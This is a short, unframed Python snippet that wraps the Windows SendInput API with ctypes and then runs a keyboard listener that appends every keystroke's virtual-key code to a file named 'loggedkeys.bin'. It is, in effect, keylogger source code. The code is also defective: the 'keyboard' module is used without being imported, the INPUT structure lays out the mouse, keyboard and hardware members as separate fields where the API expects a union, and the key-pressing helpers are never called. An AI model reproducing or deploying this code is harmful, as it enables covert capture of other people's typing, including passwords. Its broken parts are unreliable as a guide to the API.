`python
import ctypes
from ctypes import wintypes
import os

user32 = ctypes.WinDLL('user32', use_last_error=True)

KEYEVENTF_KEYUP = 0x0002
INPUT_MOUSE = 0
INPUT_KEYBOARD = 1
INPUT_HARDWARE = 2
KEYEVENTF_EXTENDEDKEY = 0x0001
MAPVK_VK_TO_VSC = 0

# msdn.microsoft.com/en-us/library/dd375731
class MOUSEINPUT(ctypes.Structure):
    _fields_ = (('dx', wintypes.LONG), ('dy', wintypes.LONG), ('mouseData', wintypes.DWORD), ('dwFlags', wintypes.DWORD), ('time', wintypes.DWORD), ('dwExtraInfo', ctypes.POINTER(wintypes.BYTE))) 

# msdn.microsoft.com/en-us/library/dd375735
class KEYBDINPUT(ctypes.Structure):
    _fields_ = (('wVk', wintypes.WORD), ('wScan', wintypes.WORD), ('dwFlags', wintypes.DWORD), ('time', wintypes.DWORD), ('dwExtraInfo', ctypes.POINTER(wintypes.BYTE))) 

# msdn.microsoft.com/en-us/library/dd375738
class HARDWAREINPUT(ctypes.Structure):
    _fields_ = (('uMsg', wintypes.DWORD), ('wParamL', wintypes.WORD), ('wParamH', wintypes.WORD)) 

# msdn.microsoft.com/en-us/library/dd375720
class INPUT(ctypes.Structure):
    _fields_ = (('type', wintypes.DWORD), ('mi', MOUSEINPUT), ('ki', KEYBDINPUT), ('hi', HARDWAREINPUT)) 

def press_key(hex_key_code):
    extra = ctypes.c_ulong(0)
    ii_ = INPUT(type=INPUT_KEYBOARD, ki=KEYBDINPUT(wVk=hex_key_code))
    user32.SendInput(1, ctypes.pointer(ii_), ctypes.sizeof(ii_))

def release_key(hex_key_code):
    extra = ctypes.c_ulong(0)
    ii_ = INPUT(type=INPUT_KEYBOARD, ki=KEYBDINPUT(wVk=hex_key_code, dwFlags=KEYEVENTF_KEYUP))
    user32.SendInput(1, ctypes.pointer(ii_), ctypes.sizeof(ii_))

def on_press(key):
    try:
        with open('loggedkeys.bin', 'ab') as f:
            if hasattr(key, 'vk'):
                f.write(bytes([key.vk]))
    except Exception as e:
        print("Error occurred while writing to file:", str(e))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()`